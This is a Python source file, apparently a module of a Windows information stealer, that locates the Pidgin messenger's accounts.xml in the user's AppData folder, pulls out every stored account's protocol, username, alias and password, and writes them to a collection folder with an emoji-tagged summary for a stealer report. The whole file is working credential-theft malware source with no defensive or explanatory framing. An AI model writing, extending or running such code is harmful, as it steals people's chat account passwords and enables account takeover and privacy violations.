from os import mkdir, environ
from os.path import isfile
from xml.etree.ElementTree import fromstring
from manager.logger import Log
from preferences.config import config


def Pidgin():
    msgInfo = ""
    roaming = environ["APPDATA"]
    pathToLogs = config.pathToLogs
    directory = [
        roaming + '\\.purple\\accounts.xml'
    ]
    logs = []
    
    for file in directory:
        try:
            if isfile(file):
                with open(file, "r", encoding="utf-8") as f:
                    content = f.read()
                content = fromstring(content)
                accounts = content.findall("account")
                for account in accounts:
                    protocol = account.findtext("protocol")
                    name = account.findtext('name')
                    alias = account.findtext('alias')
                    password = account.findtext('password')
                    logs.append(f"Protocol: {protocol}\nName: {name}\nAlias: {alias}\nPassword: {password}\n")
            if logs:
                msgInfo+="\n∟📨Pidgin"
                mkdir(pathToLogs+"\\Pidgin\\")
                with open(pathToLogs+"\\Pidgin\\accounts.txt", 'w', encoding='UTF-8') as f:
                    for log in logs:
                        f.write(log+'\n\n')
        except Exception as e:
            Log(f"Pidgin ---> {e}")
    return msgInfo